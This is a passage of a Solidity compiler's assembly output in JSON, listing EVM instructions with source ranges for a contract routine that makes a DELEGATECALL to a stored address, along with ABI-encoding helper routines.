											"source": 0,
											"value": "1"
										},
										{
											"begin": 1275,
											"end": 1287,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1275,
											"end": 1287,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1287,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1287,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1287,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 1275,
											"end": 1287,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1287,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1287,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1287,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1275,
											"end": 1287,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1300,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1275,
											"end": 1300,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1312,
											"end": 1335,
											"name": "PUSH",
											"source": 0,
											"value": "1D263F678198AFCB61494C86D0B849D04A869F89E604450AE1A549AA6619DD3D"
										},
										{
											"begin": 1336,
											"end": 1341,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1301,
											"end": 1342,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1301,
											"end": 1342,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1301,
											"end": 1342,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 1301,
											"end": 1342,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1301,
											"end": 1342,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 1301,
											"end": 1342,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 1301,
											"end": 1342,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1301,
											"end": 1342,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1301,
											"end": 1342,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 1301,
											"end": 1342,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 1301,
											"end": 1342,
											"name": "tag",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 1301,
											"end": 1342,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1301,
											"end": 1342,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1301,
											"end": 1342,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1301,
											"end": 1342,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 1301,
											"end": 1342,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1301,
											"end": 1342,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 1301,
											"end": 1342,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 1301,
											"end": 1342,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 1301,
											"end": 1342,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1301,
											"end": 1342,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1301,
											"end": 1342,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1301,
											"end": 1342,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1301,
											"end": 1342,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "tag",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "DELEGATECALL",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "26"
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "PUSH",
											"source": 0,
											"value": "3F"
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "tag",
											"source": 0,
											"value": "26"
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "tag",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1275,
											"end": 1343,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1137,
											"end": 1355,
											"name": "tag",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 1137,
											"end": 1355,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1048,
											"end": 1362,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1006,
											"end": 1362,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1006,
											"end": 1362,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 7,
											"end": 116,
											"name": "tag",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 7,
											"end": 116,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 88,
											"end": 109,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 103,
											"end": 108,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 88,
											"end": 109,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "31"
										},
										{
											"begin": 88,
											"end": 109,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 88,
											"end": 109,
											"name": "tag",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 88,
											"end": 109,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 83,
											"end": 86,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 76,
											"end": 110,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 7,
											"end": 116,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 116,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 116,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 122,
											"end": 240,
											"name": "tag",
											"source": 1,
											"value": "32"
										},
										{
											"begin": 122,
											"end": 240,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 209,
											"end": 233,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 227,
											"end": 232,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 209,
											"end": 233,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "35"
										},
										{
											"begin": 209,
											"end": 233,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 209,
											"end": 233,
											"name": "tag",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 209,
											"end": 233,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 204,
											"end": 207,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 197,
											"end": 234,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 122,
											"end": 240,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 122,
											"end": 240,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 122,
											"end": 240,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 246,
											"end": 619,
											"name": "tag",
											"source": 1,
											"value": "36"
										},
										{
											"begin": 246,
											"end": 619,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 350,
											"end": 353,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 378,
											"end": 416,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "38"
										},
										{
											"begin": 410,
											"end": 415,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 378,
											"end": 416,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "39"
										},
										{
											"begin": 378,
											"end": 416,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 378,
											"end": 416,
											"name": "tag",
											"source": 1,
											"value": "38"
										},
										{
											"begin": 378,
											"end": 416,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 432,
											"end": 520,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 513,
											"end": 519,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 508,
											"end": 511,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 432,
											"end": 520,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "41"
										},
										{
											"begin": 432,
											"end": 520,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 432,
											"end": 520,
											"name": "tag",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 432,
											"end": 520,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 425,
											"end": 520,
											"name": "SWAP4",
											"source": 1
										},
										{
											"begin": 425,
											"end": 520,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 529,
											"end": 581,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "42"
										},
										{
											"begin": 574,
											"end": 580,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 569,
											"end": 572,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 562,
											"end": 566,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 555,
											"end": 560,
											"name": "DUP7",
											"source": 1
										},
										{
											"begin": 551,
											"end": 567,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 529,
											"end": 581,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "43"
										},
										{
											"begin": 529,
											"end": 581,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 529,
											"end": 581,
											"name": "tag",
											"source": 1,
											"value": "42"
										},
										{
											"begin": 529,
											"end": 581,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 606,
											"end": 612,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 601,
											"end": 604,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 597,
											"end": 613,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 590,
											"end": 613,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 590,
											"end": 613,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 354,
											"end": 619,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 246,
											"end": 619,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 246,
											"end": 619,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 246,
											"end": 619,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 246,
											"end": 619,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 246,
											"end": 619,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 625,
											"end": 743,
											"name": "tag",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 625,
											"end": 743,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 712,
											"end": 736,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "46"
										},
										{
											"begin": 730,
											"end": 735,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 712,
											"end": 736,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "47"
										},
										{
											"begin": 712,
											"end": 736,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 712,
											"end": 736,
											"name": "tag",
											"source": 1,
											"value": "46"
										},
										{
											"begin": 712,
											"end": 736,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 707,
											"end": 710,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 700,
											"end": 737,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 625,
											"end": 743,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 625,
											"end": 743,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 625,
											"end": 743,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 749,
											"end": 1020,
											"name": "tag",
											"source": 1,
											"value": "17"
										},
										{
											"begin": 749,
											"end": 1020,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 879,
											"end": 882,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 901,
											"end": 994,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "49"
										},
										{
											"begin": 990,
											"end": 993,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 981,
											"end": 987,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 901,
											"end": 994,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "36"
										},
										{
											"begin": 901,
											"end": 994,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 901,
											"end": 994,
											"name": "tag",
											"source": 1,
											"value": "49"
										},
										{
											"begin": 901,
											"end": 994,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 894,
											"end": 994,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 894,
											"end": 994,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1011,
											"end": 1014,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1004,
											"end": 1014,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1004,
											"end": 1014,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 749,
											"end": 1020,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 749,
											"end": 1020,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 749,
											"end": 1020,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 749,
											"end": 1020,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 749,
											"end": 1020,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1026,
											"end": 1346,
											"name": "tag",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 1026,
											"end": 1346,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1141,
											"end": 1145,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1179,
											"end": 1181,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1168,
											"end": 1177,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1164,
											"end": 1182,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1156,
											"end": 1182,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1156,
											"end": 1182,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1192,
											"end": 1263,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "51"
										},
										{
											"begin": 1260,
											"end": 1261,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1249,
											"end": 1258,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1245,
											"end": 1262,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1236,
											"end": 1242,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 1192,
											"end": 1263,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "32"
										},
										{
											"begin": 1192,
											"end": 1263,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1192,
											"end": 1263,
											"name": "tag",
											"source": 1,
											"value": "51"
										},
										{
											"begin": 1192,
											"end": 1263,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1273,
											"end": 1339,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "52"
										},
										{
											"begin": 1335,
											"end": 1337,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1324,
											"end": 1333,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1320,
											"end": 1338,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1311,
											"end": 1317,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 1273,
											"end": 1339,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 1273,
											"end": 1339,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1273,
											"end": 1339,
											"name": "tag",
											"source": 1,
											"value": "52"
										},
										{
											"begin": 1273,
											"end": 1339,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1026,
											"end": 1346,
											"name": "SWAP4",
											"source": 1
										},
										{
											"begin": 1026,
											"end": 1346,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1026,
											"end": 1346,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1026,
											"end": 1346,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1026,
											"end": 1346,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1026,
											"end": 1346,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1352,
											"end": 1574,
											"name": "tag",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 1352,
											"end": 1574,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1445,
											"end": 1449,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1483,
											"end": 1485,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1472,
											"end": 1481,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1468,
											"end": 1486,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1460,
											"end": 1486,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1460,
											"end": 1486,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1496,
											"end": 1567,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "54"
										},
										{
											"begin": 1564,
											"end": 1565,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1553,
											"end": 1562,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1549,
											"end": 1566,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1540,
											"end": 1546,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 1496,
											"end": 1567,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 1496,
											"end": 1567,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1496,
											"end": 1567,
											"name": "tag",
											"source": 1,
											"value": "54"
										},
										{
											"begin": 1496,
											"end": 1567,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1352,
											"end": 1574,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1352,
											"end": 1574,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1352,
											"end": 1574,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1352,
											"end": 1574,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1352,
											"end": 1574,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1580,
											"end": 1678,
											"name": "tag",
											"source": 1,
											"value": "39"
										},
										{
											"begin": 1580,
											"end": 1678,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1631,
											"end": 1637,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1665,
											"end": 1670,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1659,
											"end": 1671,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1649,
											"end": 1671,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1649,
											"end": 1671,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1580,
											"end": 1678,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1580,
											"end": 1678,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1580,
											"end": 1678,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1580,
											"end": 1678,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1684,
											"end": 1831,
											"name": "tag",
											"source": 1,
											"value": "41"
										},
										{
											"begin": 1684,
											"end": 1831,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1785,
											"end": 1796,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1822,
											"end": 1825,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1807,
											"end": 1825,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1807,
											"end": 1825,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1684,
											"end": 1831,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1684,
											"end": 1831,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1684,
											"end": 1831,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1684,
											"end": 1831,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1684,
											"end": 1831,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1837,
											"end": 2022,
											"name": "tag",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 1837,
											"end": 2022,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1877,
											"end": 1878,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1894,
											"end": 1914,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "58"
										},
										{
											"begin": 1912,
											"end": 1913,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1894,
											"end": 1914,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "47"
										},
										{
											"begin": 1894,
											"end": 1914,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1894,
											"end": 1914,
											"name": "tag",
											"source": 1,
											"value": "58"
										},
										{
											"begin": 1894,
											"end": 1914,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1889,
											"end": 1914,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1889,
											"end": 1914,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1928,
											"end": 1948,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "59"
										},
										{
											"begin": 1946,
											"end": 1947,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1928,
											"end": 1948,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "47"
										},
										{
											"begin": 1928,
											"end": 1948,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1928,
											"end": 1948,
											"name": "tag",
											"source": 1,
											"value": "59"
										},
										{
											"begin": 1928,
											"end": 1948,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1923,
											"end": 1948,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1923,
											"end": 1948,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1967,
											"end": 1968,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1957,
											"end": 1992,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "60"
										},
										{
											"begin": 1957,
											"end": 1992,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1972,
											"end": 1990,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "61"
										},
										{
											"begin": 1972,
											"end": 1990,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "62"
										},
										{
											"begin": 1972,
											"end": 1990,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1972,
											"end": 1990,
											"name": "tag",
											"source": 1,
											"value": "61"
										},
										{
											"begin": 1972,
											"end": 1990,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1957,
											"end": 1992,
											"name": "tag",
											"source": 1,
											"value": "60"
										},
										{
											"begin": 1957,
											"end": 1992,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2014,
											"end": 2015,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2011,
											"end": 2012,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2007,
											"end": 2016,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 2002,
											"end": 2016,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2002,
											"end": 2016,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1837,
											"end": 2022,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1837,
											"end": 2022,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1837,
											"end": 2022,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1837,
											"end": 2022,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1837,
											"end": 2022,
											"name": "JUMP",
